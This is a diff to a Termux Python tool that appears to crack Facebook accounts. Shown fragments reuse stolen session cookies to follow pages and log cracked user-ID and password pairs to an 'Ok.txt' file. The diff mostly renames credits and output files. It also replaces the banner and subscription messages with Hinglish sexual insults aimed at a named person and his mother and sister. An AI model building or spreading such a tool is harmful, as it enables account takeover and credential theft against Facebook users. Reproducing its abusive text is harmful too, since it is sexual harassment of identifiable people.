@@ -79,8 +79,8 @@ def back():
 	login()
 
 ah="TIWARI-"
-imt="-M4786=="
-ak=" SOURAV-"
+imt="-S9106=="
+ak=" RAHUL-"
 myid=uuid.uuid4().hex[:10].upper()
 try:
 	key1 = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
@@ -379,7 +379,7 @@ def follow(ses,coki):
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
 logo = ("""\033[1;32m 
- 033[1;32m ________  ________  ___  ___  ________  ________  ___      ___ 
+ \033[1;32m ________  ________  ___  ___  ________  ________  ___      ___ 
  \033[1;32m|\   ____\|\   __  \|\  \|\  \|\   __  \|\   __  \|\  \    /  /|
  \033[1;33m\ \  \___|\ \  \|\  \ \  \\\  \ \  \|\  \ \  \|\  \ \  \  /  / /
  \033[1;32m \ \_____  \ \  \\\  \ \  \\\  \ \   _  _\ \   __  \ \  \/  / / 
@@ -387,12 +387,25 @@ logo = ("""\033[1;32m
  \033[1;32m    ____\_\  \ \_______\ \_______\ \__\\ _\\ \__\ \__\ \__/ /   
  \033[1;33m   |\_________\|_______|\|_______|\|__|\|__|\|__|\|__|\|__|/    
   \033[1;32m  \|_________|                                                 
+                                                                
+                                                                
+                                                                
+                                                                
+                                                                
+                                                                
+                                                                
+                                                                
+                                                                
+                                                                
+                                                                
+                                                                
 
 
 
-\033[1;32mAMIT KA BAAP NAAM TO SUNA HOGA
-\033[;33mAMIT KI DIDI KA BOBAS CLEAR DABAO TO OEPN CP ID JUST NOW
-\033[;32mAMIT KI MAA KO KHOD KE MAZA NA AAYE TO PAISA WAPIS 😁🖕
+
+\033[1;32mAMIT TERI MA KI CHUT LENE AAGYA 
+\033[;33AMIT KI DIDI KA  BOOBS DABAO CP ID JUST NOW 
+\033[;32mAMIT KI DIDI KA SHOW DEKHNA ME MAJA NA AAYE TO PAISA WAPIS 😁🖕
         
  
 ••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;33m
@@ -1301,7 +1314,7 @@ class Main:
 				print("\r \033[0;92m[ ALIYAN-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-SOURAV-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-ALIYAN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ ALIYAN-OK ] %s | %s\033[0;97m         "%(uid, pw))
@@ -1331,8 +1344,8 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32mAMIT KI DIDI KO JO KHODEGA USKE LIYE TOOL FREE HAI\033[1;37m\n")
-		print(" \033[1;32m Note : AMIT KI DIDI KO KHODA OR ENJOY KARO   \033[1;37m")
+		print(" \033[1;32m AMIT KI DIDI KI CHUT KO JO JO MAREGA USKE KE LIYE TOOL FREE HAI\033[1;37m\n")
+		print(" \033[1;32m Note : AMIT TERA BAAP SOURAV TIWARI HAI   \033[1;37m")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
